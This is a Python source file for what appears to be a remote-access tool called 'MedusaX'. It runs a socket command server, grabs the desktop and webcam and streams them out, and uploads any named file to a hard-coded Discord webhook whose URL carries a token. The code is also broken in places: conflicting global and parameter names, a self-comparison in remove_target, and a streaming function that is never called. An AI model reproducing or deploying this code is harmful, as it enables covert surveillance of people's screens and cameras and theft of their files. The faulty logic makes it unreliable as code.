import socket
import threading
import os
import cv2
import numpy as np
import pyautogui
import requests
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import Qt

# Server socket
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 9999
clients = []
target_ip = None

# Set up the server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(5)

def handle_client(client_socket, client_address):
    """Handles each client connection."""
    print(f"[+] New connection from {client_address}")
    clients.append(client_socket)
    
    while True:
        try:
            # Listen for commands
            command = client_socket.recv(1024).decode('utf-8')
            if command == "!stream":
                print("[*] Stream command received")
                # Show GUI if activated
                start_gui()
            elif command.startswith("!download"):
                filename = command.split(" ")[1]
                send_file_to_discord(filename)
            elif command.startswith("!set target"):
                target_ip = command.split(" ")[2]
                set_target(target_ip)
            elif command.startswith("!remove target"):
                target_ip = command.split(" ")[2]
                remove_target(target_ip)
            elif command == "!list":
                show_clients()
            else:
                print("[*] Command not recognized.")
        except Exception as e:
            print(f"Error: {e}")
            clients.remove(client_socket)
            client_socket.close()
            break

def start_gui():
    """Starts the GUI for server-side control."""
    app = QtWidgets.QApplication([])
    window = QtWidgets.QWidget()
    window.setWindowTitle("MedusaX Server")
    window.setGeometry(100, 100, 800, 600)
    window.show()
    app.exec_()

def send_file_to_discord(filepath):
    """Sends a file to a Discord webhook."""
    url = "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"
    with open(filepath, 'rb') as f:
        files = {'file': (filepath, f)}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            print("[+] Sent!")
        else:
            print("[-] Failed to send file.")

def show_clients():
    """Displays connected clients."""
    if len(clients) == 0:
        print("[-] No clients connected.")
    else:
        for client in clients:
            print(f"Client {client.getpeername()}")

def set_target(target_ip):
    """Sets the target client to control."""
    global target_ip
    target_ip = target_ip
    print(f"[+] Target set to {target_ip}")

def remove_target(target_ip):
    """Removes the target from control."""
    global target_ip
    if target_ip == target_ip:
        target_ip = None
        print(f"[-] Target {target_ip} removed.")
    else:
        print(f"[-] Target {target_ip} not found.")

def stream_desktop_and_webcam(client_socket):
    """Streams desktop and webcam."""
    # Desktop stream (PyAutoGUI screen capture)
    screen = pyautogui.screenshot()
    screen_np = np.array(screen)
    screen_bgr = cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR)
    _, screen_bytes = cv2.imencode('.png', screen_bgr)
    client_socket.sendall(screen_bytes.tobytes())
    
    # Webcam stream (using OpenCV)
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, webcam_bytes = cv2.imencode('.jpg', frame)
        client_socket.sendall(webcam_bytes.tobytes())

def start_server():
    """Starts the server and listens for commands."""
    print("[*] Server started...")
    while True:
        client_socket, client_address = server_socket.accept()
        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()
        print("medusax >", end=" ")
        command = input()
        process_command(command)

def process_command(command):
    """Processes the commands entered in CLI prompt."""
    global target_ip
    if command == "!stream":
        print("[*] Stream activated.")
        start_gui()
    elif command == "!list":
        show_clients()
    elif command.startswith("!set target"):
        target_ip = command.split(" ")[2]
        set_target(target_ip)
    elif command.startswith("!remove target"):
        target_ip = command.split(" ")[2]
        remove_target(target_ip)
    elif command.startswith("!download"):
        filename = command.split(" ")[1]
        send_file_to_discord(filename)
    else:
        print("[-] Command not recognized.")
    print("medusax >", end=" ")

if __name__ == "__main__":
    start_server()
